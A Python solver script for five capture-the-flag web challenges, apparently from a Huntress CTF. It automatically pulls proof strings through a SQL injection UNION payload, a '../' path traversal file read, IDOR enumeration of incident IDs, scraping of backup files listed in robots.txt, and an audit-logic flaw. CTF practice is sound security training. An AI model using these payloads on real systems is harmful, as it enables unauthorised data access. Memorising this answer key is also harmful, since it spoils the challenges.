#!/usr/bin/env python3
"""Proof collector for the assigned Huntress CTF web targets.

This script prints proof values. It does not submit answers to the Game Master.
"""

import argparse
import http.cookiejar
import json
import re
import urllib.parse
import urllib.request


PROOF_RE = re.compile(r"proof_[0-9a-f]{32}")
USER_AGENT = "HuntressCTF-writeup-solver/1.0"
TIMEOUT = 15


class Target:
    def __init__(self, url):
        self.base = url.rstrip("/")
        self.cookies = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookies)
        )

    def request(self, path, method="GET", body=None):
        data = None if body is None else json.dumps(body).encode()
        headers = {"User-Agent": USER_AGENT}
        if body is not None:
            headers["Content-Type"] = "application/json"
        request = urllib.request.Request(
            self.base + path,
            data=data,
            headers=headers,
            method=method,
        )
        with self.opener.open(request, timeout=TIMEOUT) as response:
            return response.read()

    def text(self, path, method="GET", body=None):
        return self.request(path, method, body).decode("utf-8", "replace")

    def json(self, path, method="GET", body=None):
        return json.loads(self.request(path, method, body))


def proof_from(text):
    match = PROOF_RE.search(text)
    if not match:
        raise RuntimeError("No proof string found in the target response")
    return match.group(0)


def solve_audit(url):
    target = Target(url)
    clues = target.json("/api/clues")
    feature_route = clues["feature_route"]
    audit_route = clues["secondary_route"]

    export = target.json(feature_route, "POST", {})
    export_id = export["export_id"]
    audit = target.json(audit_route)
    matching_events = [
        event
        for event in audit.get("events", [])
        if event.get("export_id") == export_id
    ]
    if not matching_events:
        raise RuntimeError(f"No audit event found for export {export_id}")

    report = target.json(
        audit_route,
        "POST",
        {
            "export_id": export_id,
            "missing_event": "protected_export",
            "observed_event": matching_events[-1]["event"],
        },
    )
    if report.get("effect") != "decisive_security_event_missing":
        raise RuntimeError(f"Unexpected audit report: {report}")
    return proof_from(report.get("evidence", ""))


def solve_archive(url):
    target = Target(url)
    robots = target.text("/robots.txt")
    disallowed = re.findall(r"(?im)^Disallow:\s*(\S+)", robots)
    for directory in disallowed:
        listing = target.text(directory)
        links = re.findall(r"""href=["']([^"']+\.bak)["']""", listing, re.I)
        for link in links:
            path = urllib.parse.urljoin(target.base + "/", link)
            parsed = urllib.parse.urlsplit(path)
            body = target.text(parsed.path)
            match = PROOF_RE.search(body)
            if match:
                return match.group(0)
    raise RuntimeError("No proof found in the robots.txt-disclosed backup files")


def solve_idor(url):
    target = Target(url)
    target.text("/")  # Establish the assigned target's session cookie.
    events = target.json("/api/events")
    for event in events.get("events", []):
        if event.get("visibility") != "reference_only":
            continue
        case_id = event.get("case_id")
        if case_id is None:
            continue
        try:
            incident = target.json(f"/api/incidents/{case_id}")
        except Exception:
            continue
        match = PROOF_RE.search(json.dumps(incident))
        if match:
            return match.group(0)
    raise RuntimeError("No proof found through a reference_only case")


def solve_sqli(url):
    target = Target(url)
    payload = "') UNION SELECT id,title,topic,summary FROM articles-- "
    query = urllib.parse.urlencode({"q": payload})
    return proof_from(target.text("/explore?" + query))


def solve_lfi(url):
    target = Target(url)
    query = urllib.parse.urlencode(
        {"doc": "../../../../run/huntress/objective.txt"}
    )
    return proof_from(target.text("/notes.php?" + query))


SOLVERS = {
    "audit": solve_audit,
    "archive": solve_archive,
    "idor": solve_idor,
    "sqli": solve_sqli,
    "lfi": solve_lfi,
}


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    subparsers = parser.add_subparsers(dest="mode", required=True)
    for name in SOLVERS:
        subparser = subparsers.add_parser(name)
        subparser.add_argument("target_url")
    mastery = subparsers.add_parser(
        "mastery", help="solve the five targets in the assigned mastery order"
    )
    mastery.add_argument("targets", nargs=5, metavar="TARGET_URL")
    args = parser.parse_args()

    if args.mode == "mastery":
        order = ("archive", "idor", "sqli", "lfi", "audit")
        answers = {
            f"proof-{index}": SOLVERS[solver](url)
            for index, (solver, url) in enumerate(zip(order, args.targets), 1)
        }
        print(json.dumps(answers, indent=2))
    else:
        print(SOLVERS[args.mode](args.target_url))


if __name__ == "__main__":
    main()
